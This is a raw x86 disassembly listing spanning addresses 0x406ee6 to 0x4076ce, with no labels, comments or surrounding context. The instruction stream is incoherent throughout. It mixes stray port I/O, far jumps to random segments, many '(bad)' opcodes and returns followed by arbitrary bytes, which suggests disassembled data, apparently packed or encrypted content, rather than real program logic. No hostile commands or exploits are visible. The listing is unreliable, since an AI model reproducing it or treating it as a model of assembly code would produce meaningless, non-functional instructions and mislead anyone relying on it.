  406ee6:	jb     0x406eee
  406ee8:	or     DWORD PTR [eax-0x16],eax
  406eeb:	inc    DWORD PTR [eax-0x5a]
  406eee:	xchg   ebp,eax
  406eef:	mov    ebp,0xba233ec6
  406ef4:	pop    ecx
  406ef5:	ret    0xd4c5
  406ef8:	mov    fs,WORD PTR [edx-0x40]
  406efb:	mov    WORD PTR [esi+0x5d],ds
  406efe:	call   0x2ea63e94
  406f03:	cld    
  406f04:	xor    dh,bh
  406f06:	jne    0x406f05
  406f08:	ret    
  406f09:	add    DWORD PTR [ebp+0xa3222eb],esi
  406f0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f10:	retf   0xc85
  406f13:	sub    eax,0x848592f6
  406f18:	jns    0x406f5f
  406f1a:	xor    BYTE PTR [ebx],bh
  406f1c:	mov    esi,0xfad96d22
  406f21:	push   ss
  406f22:	outs   dx,DWORD PTR ds:[esi]
  406f23:	loope  0x406f4e
  406f25:	lods   al,BYTE PTR ds:[esi]
  406f26:	inc    eax
  406f27:	nop
  406f28:	mov    ds:0xa46fa27d,al
  406f2d:	stc    
  406f2e:	dec    esp
  406f2f:	dec    esi
  406f30:	out    dx,eax
  406f31:	adc    BYTE PTR [ebp+0x26],ch
  406f34:	stos   DWORD PTR es:[edi],eax
  406f35:	pop    eax
  406f36:	push   ebx
  406f37:	push   ecx
  406f38:	cmp    al,0xaf
  406f3a:	sub    edx,ebp
  406f3c:	mov    ch,0x67
  406f3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f3f:	lea    ebp,[eax-0x6bd43953]
  406f45:	leave  
  406f46:	aas    
  406f47:	stos   DWORD PTR es:[edi],eax
  406f48:	pinsrw mm3,WORD PTR [ebp+0x18b4a2c0],0x4
  406f50:	dec    edi
  406f51:	gs jecxz 0x406f1a
  406f54:	ds mov ah,0x5d
  406f57:	mov    DWORD PTR [ebx],edi
  406f59:	dec    ebx
  406f5a:	lea    eax,[edx*2+0x4194a70c]
  406f61:	or     al,0x6b
  406f63:	test   edi,ebx
  406f65:	push   edx
  406f66:	lahf   
  406f67:	add    DWORD PTR [esi],0xcee94e46
  406f6d:	sub    dh,BYTE PTR [ecx+0x404083a2]
  406f73:	nop
  406f74:	mov    ch,0xb3
  406f76:	in     eax,dx
  406f77:	sbb    BYTE PTR [esp+ecx*8],ah
  406f7a:	pop    ecx
  406f7b:	cmp    BYTE PTR [ebp+0xc],dl
  406f7e:	sub    edx,ecx
  406f80:	gs sbb al,0xd5
  406f83:	nop
  406f84:	mov    esi,0x414573d6
  406f89:	mov    edi,0x2953bf5a
  406f8e:	sbb    al,0xa8
  406f90:	je     0x40700e
  406f92:	or     BYTE PTR [ebx+edi*8],al
  406f95:	or     dl,BYTE PTR [eax+ebx*1+0x12fb7eb5]
  406f9c:	jbe    0x406f2e
  406f9e:	shr    BYTE PTR [ebp+0x3b],0xe2
  406fa2:	stos   DWORD PTR es:[edi],eax
  406fa3:	jmp    0x6c1c:0x71ad710b
  406faa:	ins    DWORD PTR es:[edi],dx
  406fab:	mov    ds:0x6d95d10e,eax
  406fb0:	clc    
  406fb1:	inc    ebp
  406fb2:	xor    eax,0x7a104cf2
  406fb7:	ret    0x162a
  406fba:	addr16 (bad) 
  406fbc:	sbb    DWORD PTR [edx+0x2cc42b8],ebx
  406fc2:	mul    ecx
  406fc4:	into   
  406fc5:	aaa    
  406fc6:	std    
  406fc7:	gs test eax,0xff600b27
  406fcd:	icebp  
  406fce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406fcf:	test   eax,0x714bfc2
  406fd4:	outs   dx,DWORD PTR ds:[esi]
  406fd5:	lock push edi
  406fd7:	jecxz  0x406faf
  406fd9:	jb     0x406fe6
  406fdb:	sbb    eax,0x3cc0074f
  406fe0:	aam    0x15
  406fe2:	mov    cl,0x22
  406fe4:	mov    DWORD PTR [edi+0x4c],ebp
  406fe7:	out    dx,al
  406fe8:	sahf   
  406fe9:	pop    eax
  406fea:	mov    ds:0x3f1208e,al
  406fef:	mov    al,ds:0xad512cb5
  406ff4:	sub    al,0x23
  406ff6:	aad    0xe4
  406ff8:	fld    DWORD PTR [eax-0xb5744e1]
  406ffe:	out    0x53,eax
  407000:	jbe    0x406f95
  407002:	dec    ebp
  407003:	scas   eax,DWORD PTR es:[edi]
  407004:	in     al,dx
  407005:	jnp    0x406fa5
  407007:	push   0x21
  407009:	xchg   ebx,eax
  40700a:	and    dh,dl
  40700c:	aas    
  40700d:	xchg   edi,eax
  40700e:	xor    al,BYTE PTR [ecx]
  407010:	push   eax
  407011:	sub    eax,DWORD PTR [ebx+eax*8+0x53]
  407015:	dec    eax
  407016:	aaa    
  407017:	adc    DWORD PTR [esi+0x1c82e4dc],0xffffffc8
  40701e:	dec    esi
  40701f:	jecxz  0x407030
  407021:	or     edx,esi
  407023:	push   ebx
  407024:	ret    0x2ca8
  407027:	cs mov ch,0x1a
  40702a:	mov    cl,0x9c
  40702c:	pop    esi
  40702d:	fwait
  40702e:	bound  esp,QWORD PTR [edx-0x1b]
  407031:	mov    ax,ds:0xf63a957d
  407037:	out    0xc,eax
  407039:	fadd   DWORD PTR [bp+di+0x6feb]
  40703f:	dec    ebp
  407040:	inc    BYTE PTR [ebx+0xc]
  407043:	mov    ch,0x2c
  407045:	mov    bh,0xa8
  407047:	sub    DWORD PTR [edx],edi
  407049:	mov    BYTE PTR [eax+0x3b],bl
  40704c:	repnz sbb ah,BYTE PTR ds:[edi+0x62]
  407051:	popf   
  407052:	mov    dh,0x27
  407054:	bnd jmp 0x1e5ab6a8
  40705a:	sub    al,0x47
  40705c:	iret   
  40705d:	ret    0x5262
  407060:	xor    ch,bh
  407062:	mov    al,ds:0x383a4743
  407067:	lea    eax,[esi-0x3e]
  40706a:	js     0x407007
  40706c:	mov    al,0x45
  40706e:	xor    BYTE PTR [edi-0x7390db86],ah
  407074:	jns    0x407098
  407076:	xor    al,0xc7
  407078:	jmp    0x407013
  40707a:	cmp    ch,BYTE PTR [edi-0x3a]
  40707d:	jl     0x407027
  40707f:	ret    0xe790
  407082:	mov    bl,bl
  407084:	mov    BYTE PTR [edx+0x4d],bh
  407087:	or     DWORD PTR [ebx+0x63248702],ecx
  40708d:	rcl    DWORD PTR [ecx],0x41
  407090:	in     al,dx
  407091:	mov    al,0xb4
  407093:	mov    esi,0x11fefb5d
  407098:	fstp   DWORD PTR [ebx+0xd154b9d]
  40709e:	nop
  40709f:	dec    esi
  4070a0:	mov    eax,0x496df548
  4070a5:	mov    ah,0x53
  4070a7:	cmp    al,0x47
  4070a9:	pop    ss
  4070aa:	adc    al,0x8
  4070ac:	rcr    DWORD PTR [esi],1
  4070ae:	mov    ds:0x6b13a30,eax
  4070b3:	scas   al,BYTE PTR es:[edi]
  4070b4:	popf   
  4070b5:	jne    0x40706a
  4070b7:	jle    0x40706b
  4070b9:	sbb    al,0x19
  4070bb:	(bad)  
  4070bc:	hlt    
  4070bd:	les    edi,FWORD PTR [edi]
  4070bf:	iret   
  4070c0:	mov    dh,0xb2
  4070c2:	outs   dx,DWORD PTR ds:[esi]
  4070c3:	ret    
  4070c4:	loopne 0x40711d
  4070c6:	cwde   
  4070c7:	imul   eax,DWORD PTR [edx+0x6bad2884],0xf82e1d3d
  4070d1:	popa   
  4070d2:	aas    
  4070d3:	pop    edx
  4070d4:	test   eax,0xa10b4753
  4070d9:	and    bl,cl
  4070db:	cmp    eax,0xddd79e9b
  4070e0:	mov    ds:0xa771b355,al
  4070e5:	sahf   
  4070e6:	pop    ss
  4070e7:	shr    DWORD PTR [ebp+0x57],1
  4070ea:	div    BYTE PTR [edx-0x35]
  4070ed:	popa   
  4070ee:	fist   WORD PTR [edx]
  4070f0:	lods   al,BYTE PTR ds:[esi]
  4070f1:	out    dx,al
  4070f2:	pushw  0x7a30
  4070f6:	call   0x92bf638e
  4070fb:	fsub   st,st(4)
  4070fd:	icebp  
  4070fe:	jle    0x40712c
  407100:	scas   al,BYTE PTR es:[di]
  407102:	shl    DWORD PTR [eax+0x5f],cl
  407105:	add    al,0xaa
  407107:	(bad)
  40710a:	jle    0x407094
  40710c:	pop    ecx
  40710d:	imul   eax,esi,0xffffffc5
  407110:	mov    al,0x22
  407112:	mov    cl,0x33
  407114:	xor    esp,DWORD PTR [eax]
  407116:	ror    DWORD PTR [edi+0x3e92b465],cl
  40711c:	mov    BYTE PTR [edx+ecx*1-0x78],bh
  407120:	jmp    0xe06f:0xb83a96a3
  407127:	fmul   st(6),st
  407129:	inc    ecx
  40712a:	retf   
  40712b:	inc    esi
  40712c:	adc    al,0x4d
  40712e:	sub    eax,0x13f2fb02
  407133:	jp     0x4070f9
  407135:	mov    eax,ds:0x482c60ed
  40713a:	mov    BYTE PTR [edx],bh
  40713c:	add    edi,DWORD PTR [ecx-0x28]
  40713f:	xor    al,0x32
  407141:	xchg   DWORD PTR [edi+0x3fda62af],ebx
  407147:	fadd   DWORD PTR [edi]
  407149:	ins    DWORD PTR es:[edi],dx
  40714a:	cwde   
  40714b:	ja     0x4071c4
  40714d:	das    
  40714e:	pop    ecx
  40714f:	xchg   ecx,eax
  407150:	pusha  
  407151:	scas   eax,DWORD PTR es:[edi]
  407152:	or     bl,BYTE PTR [ecx]
  407154:	push   0x40
  407156:	mov    DWORD PTR [edi-0x49],ebx
  407159:	test   eax,0xf77c91ab
  40715e:	call   0xe21ac028
  407163:	mov    DWORD PTR [ebx+0x2d36ce01],edx
  407169:	adc    DWORD PTR [esi-0x79603eb7],0xa7a3cd50
  407173:	bswap  ebp
  407175:	push   ebp
  407176:	push   edi
  407177:	cmp    DWORD PTR [esi],0xffffffee
  40717a:	sbb    bl,BYTE PTR [eax-0x4a]
  40717d:	aam    0x3
  40717f:	cmc    
  407180:	addr16 retf 
  407182:	out    dx,al
  407183:	popa   
  407184:	inc    eax
  407185:	dec    edx
  407186:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407187:	outs   dx,BYTE PTR ds:[esi]
  407188:	xor    DWORD PTR [ecx-0x17cbdeb9],eax
  40718e:	mov    ch,0xe8
  407190:	mov    dl,0x89
  407192:	nop
  407193:	dec    esi
  407194:	(bad)  
  407195:	mov    BYTE PTR [edx+0x74b50695],ah
  40719b:	adc    edx,DWORD PTR [edx]
  40719d:	and    DWORD PTR [esi],ebx
  40719f:	lock add al,0x6f
  4071a2:	inc    ebp
  4071a3:	adc    edx,DWORD PTR [ebp-0x729df7df]
  4071a9:	or     esi,DWORD PTR [ebx]
  4071ab:	mov    ecx,0xe4de2210
  4071b0:	sub    bh,ah
  4071b2:	pusha  
  4071b3:	stos   DWORD PTR es:[edi],eax
  4071b4:	pusha  
  4071b5:	mov    ds:0xbe078131,al
  4071ba:	sub    eax,0xb92bfa99
  4071bf:	mov    DWORD PTR [edi],ecx
  4071c1:	retf   
  4071c2:	sbb    eax,0xe3738531
  4071c7:	rcr    WORD PTR [edx],0xc
  4071cb:	add    eax,0xdd4837e9
  4071d0:	cmp    BYTE PTR [esi-0x1],cl
  4071d3:	pop    ss
  4071d4:	jp     0x407218
  4071d6:	jle    0x4071a3
  4071d8:	cdq    
  4071d9:	inc    eax
  4071da:	inc    ebx
  4071db:	lahf   
  4071dc:	add    eax,0xdb3e98e8
  4071e1:	fcmovb st,st(1)
  4071e3:	jp     0x4071ae
  4071e5:	stos   DWORD PTR es:[edi],eax
  4071e6:	push   0x362f6920
  4071eb:	leave  
  4071ec:	sbb    al,0x28
  4071ee:	push   esp
  4071ef:	jg     0x40724c
  4071f1:	inc    esi
  4071f2:	ins    DWORD PTR es:[edi],dx
  4071f3:	inc    edi
  4071f4:	mov    ebx,0x7c603f22
  4071f9:	or     dl,BYTE PTR [edi+ecx*4-0x7c]
  4071fd:	loope  0x407205
  4071ff:	test   dl,al
  407201:	fist   WORD PTR [ebx+0x1]
  407204:	pop    ebx
  407205:	ret    
  407206:	sub    cl,bh
  407208:	in     eax,dx
  407209:	scas   al,BYTE PTR es:[edi]
  40720a:	push   es
  40720b:	aam    0xd0
  40720d:	iret   
  40720e:	push   ebx
  40720f:	add    esp,0x6
  407212:	test   DWORD PTR [edi],ecx
  407214:	lods   al,BYTE PTR ds:[esi]
  407215:	(bad)  
  407216:	pop    ebp
  407217:	jecxz  0x4071bb
  407219:	pop    ss
  40721a:	add    ah,dh
  40721c:	push   ebp
  40721d:	data16 not BYTE PTR [edx+0x7bb14a15]
  407224:	jae    0x40722a
  407226:	movq   mm2,QWORD PTR [edi-0xc]
  40722a:	jp     0x4071d8
  40722c:	dec    ebp
  40722d:	mov    bh,bh
  40722f:	jl     0x407249
  407231:	dec    esp
  407232:	sub    DWORD PTR [edx-0x7b306129],ecx
  407238:	inc    edi
  407239:	fild   QWORD PTR [edi-0x93af7eb]
  40723f:	mov    edx,0xf327e064
  407244:	retf   0x6d50
  407247:	adc    edi,DWORD PTR [ebx]
  407249:	pop    esi
  40724a:	sahf   
  40724b:	rcl    DWORD PTR [ebp+0xdf5d75b],1
  407251:	push   esp
  407252:	mov    al,ds:0x21023932
  407257:	cmp    al,0x11
  407259:	sar    BYTE PTR [ebx-0x271832b7],0x60
  407260:	clc    
  407261:	cmp    eax,DWORD PTR [edx+0x79]
  407264:	xor    BYTE PTR [ebx+ebp*2],0x1
  407268:	repnz dec BYTE PTR [edi-0x3e]
  40726c:	(bad)  
  40726d:	std    
  40726e:	ficomp WORD PTR [edi+0x68]
  407271:	cdq    
  407272:	xchg   ebx,eax
  407273:	push   ss
  407274:	mov    ebp,0x1fa7f66e
  407279:	or     eax,0x58f7919e
  40727e:	js     0x407276
  407280:	pushf  
  407281:	test   al,0x2c
  407283:	test   eax,0xde8fb68a
  407288:	and    eax,0x935f5286
  40728d:	adc    dl,BYTE PTR [ebp+ecx*8-0x68133672]
  407294:	pop    es
  407295:	dec    esp
  407296:	lods   al,BYTE PTR ds:[esi]
  407297:	jbe    0x407240
  407299:	sub    al,0x63
  40729b:	(bad)
  4072a0:	fldenv [esi-0x677f7571]
  4072a6:	imul   DWORD PTR [esi+0x5636ddab]
  4072ac:	ins    DWORD PTR es:[edi],dx
  4072ad:	leave  
  4072ae:	fistp  QWORD PTR [esi-0x4b]
  4072b1:	in     al,0xf8
  4072b3:	fdivp  st(1),st
  4072b5:	fisub  DWORD PTR [eax]
  4072b7:	sar    DWORD PTR [edi],0xf8
  4072ba:	out    dx,al
  4072bb:	stos   DWORD PTR es:[edi],eax
  4072bc:	jae    0x4072d1
  4072be:	cmc    
  4072bf:	sub    ch,BYTE PTR [edx]
  4072c1:	lods   eax,DWORD PTR ds:[esi]
  4072c2:	repz jnp 0x407283
  4072c5:	rol    BYTE PTR [ebx+0xb8ab7e6],cl
  4072cb:	lods   eax,DWORD PTR ds:[esi]
  4072cc:	sbb    ah,BYTE PTR [ecx+0x24]
  4072cf:	repz inc esi
  4072d1:	sbb    edi,DWORD PTR [ebx+0x0]
  4072d4:	lea    esp,[edx-0x49b7f21b]
  4072da:	push   edi
  4072db:	cmp    eax,0xbccc10ea
  4072e0:	ror    BYTE PTR [esi-0x6586165e],cl
  4072e6:	cmp    esp,DWORD PTR [ecx-0x7d]
  4072e9:	or     al,0xee
  4072eb:	rol    DWORD PTR [edi],1
  4072ed:	cmp    bh,BYTE PTR [ebx+esi*4]
  4072f0:	(bad)  
  4072f1:	xor    ebx,DWORD PTR [ecx+0x79]
  4072f4:	ret    
  4072f5:	pop    edx
  4072f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072f7:	add    eax,0x58a3202b
  4072fc:	sbb    eax,0xc311200a
  407301:	mov    ch,bh
  407303:	(bad)  
  407304:	cmc    
  407305:	inc    esi
  407306:	out    0x71,al
  407308:	pop    ds
  407309:	inc    esp
  40730a:	(bad)  
  40730b:	call   0xefe6633e
  407310:	int    0x79
  407312:	cmp    BYTE PTR [edi-0x63],0xbf
  407316:	lock scas eax,DWORD PTR es:[edi]
  407318:	das    
  407319:	call   0x74a4:0x87ce7f90
  407320:	clc    
  407321:	mov    edi,0x1d7caa03
  407326:	outs   dx,DWORD PTR ds:[esi]
  407327:	mov    esp,0x582a96a1
  40732c:	retf   
  40732d:	cmp    ah,dl
  40732f:	push   edi
  407330:	add    edx,DWORD PTR [ebp-0x58d9b2c8]
  407336:	in     al,0x7d
  407338:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407339:	pop    ss
  40733a:	out    0xa4,eax
  40733c:	xchg   ebp,eax
  40733d:	push   esp
  40733e:	push   es
  40733f:	inc    esi
  407340:	sub    al,cl
  407342:	cdq    
  407343:	jb     0x407382
  407345:	add    al,0x2
  407347:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407348:	push   esi
  407349:	scas   eax,DWORD PTR es:[edi]
  40734a:	push   ecx
  40734b:	int3   
  40734c:	sbb    al,0xf3
  40734e:	sbb    BYTE PTR [ecx+0x63],0xeb
  407352:	imul   eax,edi,0xa50c6547
  407358:	das    
  407359:	les    eax,FWORD PTR [esi+eiz*4]
  40735c:	jns    0x4073ac
  40735e:	adc    BYTE PTR [ebx],bl
  407360:	cdq    
  407361:	daa    
  407362:	test   esp,esi
  407364:	pop    ds
  407365:	cmp    BYTE PTR [ebx+0x51b0632c],bl
  40736b:	add    DWORD PTR [edi],eax
  40736d:	(bad)  
  40736e:	ror    BYTE PTR ds:0x8bef177d,1
  407374:	fs jge 0x4073ad
  407377:	push   eax
  407378:	(bad)  
  40737a:	not    BYTE PTR [edx-0x23]
  40737d:	push   ecx
  40737e:	sbb    esi,DWORD PTR [esi+0x3c923251]
  407384:	lds    ebx,FWORD PTR [ebp+0x78]
  407387:	fwait
  407388:	ds mov di,0x6235
  40738d:	mov    gs,WORD PTR [esi+ebx*8+0x38fe8acf]
  407394:	xbegin 0x7ec1b51
  40739a:	adc    eax,0x44059470
  40739f:	mov    esi,0x75244d26
  4073a4:	clc    
  4073a5:	xor    DWORD PTR ds:0x66528a49,edx
  4073ab:	jl     0x407425
  4073ad:	jb     0x4073a0
  4073af:	mov    dh,0x92
  4073b1:	cli    
  4073b2:	and    BYTE PTR [edx],dh
  4073b4:	(bad)  [ebx+0x346e33e7]
  4073ba:	mov    BYTE PTR [ecx-0x2aef02ab],bh
  4073c0:	jne    0x407365
  4073c2:	out    0xec,eax
  4073c4:	adc    eax,0x86e98bad
  4073ca:	imul   ebp,DWORD PTR [ebx-0x26f82a49],0x5c
  4073d1:	loop   0x407378
  4073d3:	in     eax,0x9e
  4073d5:	and    BYTE PTR [ebp+0x4d50e3d5],dl
  4073db:	mov    bh,0x7e
  4073dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4073de:	(bad)  
  4073df:	and    ah,BYTE PTR [eax-0x41f5fbf6]
  4073e5:	and    cl,BYTE PTR [ecx]
  4073e7:	daa    
  4073e8:	adc    al,BYTE PTR [edx+0x7e]
  4073eb:	or     DWORD PTR [ecx-0x7d0b8a7d],0x365ee77a
  4073f5:	jmp    0x5b3:0x2a64d005
  4073fc:	pop    ebx
  4073fd:	xor    eax,0x15fdcd09
  407402:	xchg   edi,eax
  407403:	mov    es,WORD PTR [ebp-0x3d]
  407406:	fcomp  QWORD PTR [eax+0x7d]
  407409:	imul   ebx,DWORD PTR [edx-0x3277ebc8],0xffffffcc
  407410:	sbb    DWORD PTR [edi-0x32],ebx
  407413:	or     BYTE PTR [esi-0x2b5602ba],0x88
  40741a:	mov    ds:0x5aa15994,eax
  40741f:	push   edi
  407420:	add    al,bl
  407422:	or     ecx,edi
  407424:	add    dh,0x63
  407427:	cmp    ebp,eax
  407429:	rol    BYTE PTR [edx-0x1b],0x95
  40742d:	dec    esi
  40742e:	outs   dx,BYTE PTR ds:[esi]
  40742f:	into   
  407430:	jecxz  0x4074a0
  407432:	inc    ecx
  407433:	(bad)  
  407434:	mov    eax,0x9947cb1c
  407439:	sahf   
  40743a:	pushf  
  40743b:	ret    
  40743c:	mov    ebp,DWORD PTR [ebp+0x450cac1a]
  407442:	(bad)  
  407443:	pop    edi
  407444:	xor    ebp,eax
  407446:	test   eax,0xa9991baf
  40744b:	scas   eax,DWORD PTR es:[edi]
  40744c:	fstp   TBYTE PTR [edi-0x45]
  40744f:	sbb    dh,BYTE PTR [edx-0x71d884d8]
  407455:	hlt    
  407456:	out    dx,al
  407457:	loope  0x40740c
  407459:	cmp    DWORD PTR [ebp+0x35],0x3b
  40745d:	lea    ecx,[bp+di-0x2f]
  407461:	adc    DWORD PTR [edi-0x5e],eax
  407464:	(bad)  
  407465:	(bad)  
  407466:	jle    0x40749b
  407468:	sub    BYTE PTR [esi],ah
  40746a:	push   ss
  40746b:	fld    DWORD PTR es:[esi-0x5efd3cc]
  407472:	jecxz  0x4074e3
  407474:	dec    esp
  407475:	and    DWORD PTR [ebx+0x29],eax
  407478:	sub    DWORD PTR [esi-0x731e414],ebp
  40747e:	(bad)  
  40747f:	jle    0x40740d
  407481:	sub    dh,BYTE PTR [ecx+0x13cff4b0]
  407487:	je     0x40747b
  407489:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40748a:	adc    BYTE PTR [ebx-0x12],cl
  40748d:	out    dx,eax
  40748e:	sub    cl,ah
  407490:	sub    ch,BYTE PTR [esi-0x57f665d2]
  407496:	add    edi,ebx
  407498:	mov    esi,0x949ff959
  40749d:	push   DWORD PTR [ebx+edi*4]
  4074a0:	pop    ecx
  4074a1:	xchg   DWORD PTR [bx+si-0x52bb],ebx
  4074a6:	sbb    ch,0x34
  4074a9:	dec    edi
  4074aa:	xor    dh,BYTE PTR [edi+0x7d97916b]
  4074b0:	(bad)  
  4074b1:	adc    al,0x82
  4074b3:	das    
  4074b4:	cmp    BYTE PTR ds:0x55f5cd57,0xa2
  4074bb:	(bad)  
  4074bc:	adc    eax,0x128c1ee6
  4074c1:	repnz pusha 
  4074c3:	push   ebp
  4074c4:	dec    esp
  4074c5:	ret    0x1846
  4074c8:	adc    edi,esi
  4074ca:	dec    esp
  4074cb:	std    
  4074cc:	lods   al,BYTE PTR ds:[esi]
  4074cd:	sbb    BYTE PTR [ecx+0x2a],0x51
  4074d1:	fisubr WORD PTR [edx-0x5f]
  4074d4:	in     eax,0x19
  4074d6:	mov    DWORD PTR [ecx-0x50],0x37e26eab
  4074dd:	jnp    0x40746a
  4074df:	sbb    esp,edx
  4074e1:	add    bl,ah
  4074e3:	mov    edi,0xe0db4019
  4074e8:	xlat   BYTE PTR ds:[ebx]
  4074e9:	or     esi,DWORD PTR [ebx+0x796c8e7]
  4074ef:	out    dx,eax
  4074f0:	inc    ecx
  4074f1:	inc    ecx
  4074f2:	ds sahf 
  4074f4:	fist   WORD PTR [esi-0x76]
  4074f7:	push   0x1f078e43
  4074fc:	je     0x4074f8
  4074fe:	and    edx,DWORD PTR [edx-0xe359434]
  407504:	xor    dl,BYTE PTR ds:0xda0fb769
  40750a:	dec    ebx
  40750b:	out    0xa6,eax
  40750d:	sub    bl,bh
  40750f:	cmp    BYTE PTR [edi+edx*4],al
  407512:	ins    BYTE PTR es:[edi],dx
  407513:	stos   DWORD PTR es:[edi],eax
  407514:	pop    ebx
  407515:	int3   
  407516:	(bad)  
  407517:	cmp    ebx,DWORD PTR [eax-0x7]
  40751a:	dec    edi
  40751b:	stos   DWORD PTR es:[edi],eax
  40751c:	mov    ch,0xaa
  40751e:	sub    dh,cl
  407520:	lods   eax,DWORD PTR ds:[esi]
  407521:	mov    cl,0xab
  407523:	adc    ch,0xc8
  407526:	enter  0xec57,0x34
  40752a:	xlat   BYTE PTR ds:[ebx]
  40752b:	add    bh,BYTE PTR [ecx-0x7bac1e35]
  407531:	cld    
  407532:	pushf  
  407533:	or     DWORD PTR [esi-0x36],edx
  407536:	dec    esi
  407537:	ins    DWORD PTR es:[edi],dx
  407538:	xchg   ecx,eax
  407539:	push   ebx
  40753a:	sbb    al,0x7a
  40753c:	xor    eax,DWORD PTR [eax-0x579b78b2]
  407542:	jns    0x4075ab
  407544:	nop
  407545:	fild   QWORD PTR [ecx-0x5e]
  407548:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407549:	sbb    BYTE PTR [edx],0x5b
  40754c:	cmp    DWORD PTR [eax],esi
  40754e:	add    cl,BYTE PTR ds:0xd59bd969
  407554:	ret    
  407555:	mov    esp,0xfe49411a
  40755a:	add    DWORD PTR [eax],edx
  40755c:	inc    esi
  40755d:	xchg   esp,eax
  40755e:	jmp    0x4e32dbb5
  407563:	aas    
  407564:	jae    0x407511
  407566:	and    DWORD PTR [edx+0x59],ebp
  407569:	xor    ch,BYTE PTR [edi+esi*4+0x21ed8fc7]
  407570:	adc    esi,edx
  407572:	mov    bh,0x92
  407574:	enter  0xe7b4,0x82
  407578:	into   
  407579:	sbb    ch,BYTE PTR [esi+ebp*2+0xc8e1afc]
  407580:	add    bh,bl
  407582:	mul    BYTE PTR [ecx-0x4068b652]
  407588:	and    esp,DWORD PTR [edx-0x215365a3]
  40758e:	aam    0xfe
  407590:	jge    0x407564
  407592:	pop    ds
  407593:	adc    al,0xee
  407595:	loop   0x407560
  407597:	jl     0x4075c1
  407599:	push   ebp
  40759a:	stc    
  40759b:	leave  
  40759c:	xlat   BYTE PTR ds:[ebx]
  40759d:	add    DWORD PTR [ecx+0x66f5c077],esp
  4075a3:	pop    ss
  4075a4:	xor    dl,BYTE PTR [ecx+0x2e]
  4075a7:	test   BYTE PTR [esi+0x3c],ah
  4075aa:	pop    ebp
  4075ab:	sar    BYTE PTR [esi+ecx*1+0x76737de5],1
  4075b2:	inc    edi
  4075b3:	sahf   
  4075b4:	push   esp
  4075b5:	dec    ebp
  4075b6:	mov    DWORD PTR [ebp-0x1f83e923],ebx
  4075bc:	push   esi
  4075bd:	pop    eax
  4075be:	mov    BYTE PTR [ebx+0x1d],cl
  4075c1:	dec    esi
  4075c2:	jbe    0x4075cf
  4075c4:	aaa    
  4075c5:	xchg   edx,eax
  4075c6:	xchg   DWORD PTR [ecx+esi*1-0x463d0492],ecx
  4075cd:	adc    dh,cl
  4075cf:	rcr    DWORD PTR [eax-0x6d],1
  4075d2:	pusha  
  4075d3:	cli    
  4075d4:	xchg   edx,eax
  4075d5:	lahf   
  4075d6:	pusha  
  4075d7:	pop    eax
  4075d8:	out    dx,al
  4075d9:	cli    
  4075da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4075db:	imul   edx,DWORD PTR [ecx-0x1168430]
  4075e2:	ds test edx,ebp
  4075e5:	xchg   ebp,eax
  4075e6:	js     0x40756e
  4075e8:	and    dh,BYTE PTR [edi+0x2977bb2a]
  4075ee:	xor    eax,0x9872d509
  4075f3:	push   edi
  4075f4:	lea    edx,[ecx-0x1712fe98]
  4075fa:	stos   DWORD PTR es:[edi],eax
  4075fb:	mov    esi,0x332a754b
  407600:	jns    0x4075ee
  407602:	enter  0xa7a7,0x8
  407606:	stos   BYTE PTR es:[edi],al
  407607:	xor    al,0x14
  407609:	xchg   ecx,eax
  40760a:	std    
  40760b:	push   edi
  40760c:	pop    ss
  40760d:	fcom   DWORD PTR [ecx]
  40760f:	fcomp  st(7)
  407611:	mov    eax,0x9c327438
  407616:	push   ebx
  407617:	add    DWORD PTR [eax+esi*2],ecx
  40761a:	scas   eax,DWORD PTR es:[edi]
  40761b:	pop    esp
  40761c:	loop   0x40766d
  40761e:	add    eax,0xf432290
  407623:	cmp    bl,ch
  407625:	sbb    DWORD PTR [eax],0xc1393237
  40762b:	dec    edi
  40762c:	ds jb  0x4075ea
  40762f:	xor    al,0x8
  407631:	repz lds ecx,FWORD PTR [esi-0x55146dab]
  407638:	sub    dh,ch
  40763a:	cmc    
  40763b:	fst    DWORD PTR [edx+0x8c5c021]
  407641:	sub    bh,BYTE PTR [ebx+0x49]
  407644:	and    ah,BYTE PTR [edi-0x72]
  407647:	pop    edx
  407648:	in     al,dx
  407649:	sbb    ch,cl
  40764b:	loop   0x407679
  40764d:	push   edx
  40764e:	or     BYTE PTR [ebx-0x472722aa],cl
  407654:	rol    DWORD PTR [esi-0x59],cl
  407657:	int    0x9b
  407659:	mov    eax,ds:0x7723ebef
  40765e:	xchg   ecx,eax
  40765f:	sbb    eax,0xea7b89a6
  407664:	retf   
  407665:	xor    bl,BYTE PTR [eax+ebx*2]
  407668:	inc    eax
  407669:	push   ebx
  40766a:	jo     0x40767b
  40766c:	imul   ebp,edi,0x6c
  40766f:	loope  0x407652
  407671:	xchg   esi,eax
  407672:	and    BYTE PTR [ebp+eax*1+0x22bf4cad],al
  407679:	fwait
  40767a:	jecxz  0x4076b6
  40767c:	pop    edx
  40767d:	test   BYTE PTR [esi-0x2a048204],bl
  407683:	shl    BYTE PTR [ebx+0x65045ee6],0x6d
  40768a:	dec    ecx
  40768b:	and    eax,0x5ad82e43
  407690:	(bad)  
  407691:	jmp    0x60b0387
  407696:	or     ebx,esi
  407698:	adc    BYTE PTR [eax],dh
  40769a:	sub    DWORD PTR [eax+0x2f],ecx
  40769d:	lds    ebp,FWORD PTR [eax-0x4f]
  4076a0:	sar    edi,0xd4
  4076a3:	div    DWORD PTR [edx]
  4076a5:	mov    esi,0x48538f6e
  4076aa:	std    
  4076ab:	push   cs
  4076ac:	dec    edx
  4076ad:	lods   eax,DWORD PTR ds:[esi]
  4076ae:	and    DWORD PTR [esi],0xffffffbb
  4076b1:	mov    esp,0xbcf0124d
  4076b6:	in     eax,0x5d
  4076b8:	fsubr  QWORD PTR [edx-0x7b]
  4076bb:	fld    QWORD PTR ds:0xf16dc354
  4076c1:	sahf   
  4076c2:	and    BYTE PTR [edx+0x11d41578],cl
  4076c8:	(bad)  
  4076c9:	push   ebp
  4076ca:	ret    0x2e43
  4076cd:	cmc    
  4076ce:	aaa    
